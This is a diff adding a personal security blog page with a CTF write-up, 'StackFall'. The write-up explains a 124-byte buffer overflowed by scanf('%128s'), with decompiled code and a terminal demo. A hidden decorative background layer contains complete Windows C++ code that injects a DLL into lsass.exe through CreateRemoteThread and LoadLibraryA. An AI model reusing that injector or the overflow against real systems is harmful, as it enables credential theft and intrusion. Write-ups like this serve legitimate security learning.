@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StackFall</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="StackFall" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>StackFall</h1>
+            
+            <p class="post-meta">Published: April 29, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">HQX{8d0b49450b73e60d6237a927f2b8e19b}</code></p>
+
+<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+
+<ol>
+  <li>After reading the description, it felt like a pwn challenge and more specifically a buffer overflow challenge where excess feeding to a buffer results in overwriting a variable and invoking a function which can be only called by a var &gt; 0 condition branch like if-else.</li>
+  <li>Just inputted a large number of ‘A’s (traditional check) and got the flag:</li>
+</ol>
+
+<h3 id="output">Output:</h3>
+
+<p><img src="/assets/images/writeups/tcs-hackquest/03-stackfall-output.png" alt="StackFall Output" /></p>
+
+<ol>
+  <li>But I didn’t stop there. After reviewing the source code of the site, I found a vulnerability of information disclosure, hence tried a payload:</li>
+</ol>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/download/healthcheck"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Which gave me a link based prompt, after downloading, I found an ELF file not stripped. Analyzing the elf in Ghidra, found the main function, which exactly matched my prediction of a classic buffer overflow. <code class="language-plaintext highlighter-rouge">healthCheck</code> function results into <code class="language-plaintext highlighter-rouge">win()</code>:</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">healthCheck</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">local_88</span> <span class="p">[</span><span class="mi">124</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
+    <span class="n">local_c</span> <span class="o">=</span> <span class="mh">0x37393835</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"=================================================================="</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">" Health Agent: Archive Node OP-DELTA (brief interactive check)"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">" Type a command and press Enter. Commands: hi, ping, status, help, quit"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">" Any other input will be treated as an exploit payload and proceed."</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102180</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"=================================================================="</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">health&gt; "</span><span class="p">);</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%128s"</span><span class="p">,</span><span class="n">local_88</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"hi"</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"hello"</span><span class="p">),</span> <span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"ping"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"pong"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"status"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"OK - archive node nominal"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"help"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Commands:"</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">" hi / hello"</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">" ping"</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">" status"</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">" quit"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_88</span><span class="p">,</span><span class="s">"quit"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">!=</span> <span class="mh">0x37393835</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">win</span><span class="p">();</span>
+                    <span class="k">return</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102270</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Goodbye."</span><span class="p">);</span>
+            <span class="cm">/* WARNING: Subroutine does not return */</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"hello"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"No input detected. Exiting."</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>We can see the buffer is of size 124 and yet accepts an extra 4 bytes of data (128) through <code class="language-plaintext highlighter-rouge">scanf</code>. Feeding extra input will definitely overflow the buffer, and hence the <code class="language-plaintext highlighter-rouge">iVar1</code> variable could be overwritten by the extra input.</li>
+</ol>
+
+<h3 id="demonstration">Demonstration:</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>himanshu@Kaaammui<span class="o">)</span>-[~/Desktop/tcs/stack]-<span class="o">(</span>13-12-2025 11:14:33<span class="o">)</span>
+└─<span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> flag.txt
+flaggg!
+^C
+┌──<span class="o">(</span>himanshu@Kaaammui<span class="o">)</span>-[~/Desktop/tcs/stack]-<span class="o">(</span>13-12-2025 11:14:54<span class="o">)</span>
+└─<span class="nv">$ </span>./healthcheck
+<span class="o">=================================================================</span>
+Health Agent: Archive Node OP-DELTA <span class="o">(</span>brief interactive check<span class="o">)</span>
+Type a <span class="nb">command </span>and press Enter. Commands: hi, ping, status, <span class="nb">help</span>, quit
+Any other input will be treated as an exploit payload and proceed.
+Note: Inputs can be noisy — unexpected behaviour may reveal secrets.
+<span class="o">==================================================================</span>
+health&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Your flag is - flaggg!
+</code></pre></div></div>
+
+<ol>
+  <li>Hence this confirms my approach.</li>
+</ol>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
